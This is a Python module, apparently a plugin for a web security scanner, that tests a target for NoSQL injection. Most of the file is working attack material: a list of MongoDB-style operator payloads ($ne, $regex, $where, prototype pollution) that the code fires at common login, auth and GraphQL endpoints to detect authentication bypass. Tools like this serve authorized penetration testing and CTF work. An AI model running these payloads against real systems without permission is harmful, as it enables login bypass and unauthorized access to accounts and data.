import json
import asyncio
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

NOSQLI_PAYLOADS = [
    ('json', {'$ne': None}),
    ('json', {'$gt': ''}),
    ('json', {'$where': '1==1'}),
    ('json', {'username': {'$ne': None}, 'password': {'$ne': None}}),
    ('json', {'$or': [{'admin': 1}, {'role': {'$gte': ''}}]}),
    ('json', {'username': 'admin', 'password': {'$regex': '.*'}}),
    ('json', {'id': {'$ne': 1, '$gt': 0}}),
    ('url', "?id[$ne]=1&pass[$ne]=1"),
    ('url', "?username[$regex]=.*&password[$regex]=.*"),
    ('url', "?id[$gt]=0&pass[$ne]=1"),
    ('url', "?__proto__[isAdmin]=true"),
    ('url', "?[$where]=1==1"),
]

TIMING_THRESHOLD = 3.0


@register_scanner(manifest=ScannerManifest(
    name="nosqli_scanner",
    category="exploit",
    risk_level="moderate",
    estimated_cost=60,
    produces_tag_patterns=["nosqli", "injection", "nosql"],
    produces_endpoint_types=[],
))
class NoSQLIScanner(BaseScanner):
    name = "nosqli_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        auth_endpoints = [
            f"{base}/login", f"{base}/api/login", f"{base}/auth",
            f"{base}/api/auth", f"{base}/signin", f"{base}/api/v1/login",
            f"{base}/graphql", f"{base}/api",
        ]

        for url in auth_endpoints:
            for payload_type, payload in NOSQLI_PAYLOADS:
                try:
                    start = asyncio.get_event_loop().time()
                    if payload_type == "json":
                        resp = await client.request(
                            "POST", url,
                            json=payload,
                            headers={"Content-Type": "application/json"},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.request(
                            "POST", url + payload,
                            follow_redirects=False,
                        )
                    elapsed = asyncio.get_event_loop().time() - start
                    self._stats["requests"] += 1

                    if elapsed > TIMING_THRESHOLD:
                        ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                        endpoints.append(ep)
                        findings.append(self.make_finding(
                            title="NoSQL Injection — Time-Based",
                            description=f"POST to {url} with NoSQL payload took {elapsed:.1f}s, suggesting injection.",
                            severity=FindingSeverity.HIGH.value,
                            endpoint=ep,
                            evidence={"url": url, "payload": str(payload), "elapsed": elapsed},
                            confidence=0.7,
                            tags=["nosqli", "timing", "injection"],
                        ))

                    body = resp.text or ""
                    if resp.status_code in (200, 500) and any(kw in body.lower() for kw in
                            ["welcome", "admin", "dashboard", "profile", "token", "session", "flag"]):
                        ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                        endpoints.append(ep)
                        findings.append(self.make_finding(
                            title="NoSQL Injection — Auth Bypass",
                            description=f"Server returned {resp.status_code} with sensitive content after NoSQL injection.",
                            severity=FindingSeverity.CRITICAL.value,
                            endpoint=ep,
                            evidence={"url": url, "payload": str(payload), "body_preview": body[:200]},
                            confidence=0.85,
                            tags=["nosqli", "auth-bypass", "injection"],
                        ))
                except Exception:
                    self._stats["errors"] += 1

        return findings, endpoints
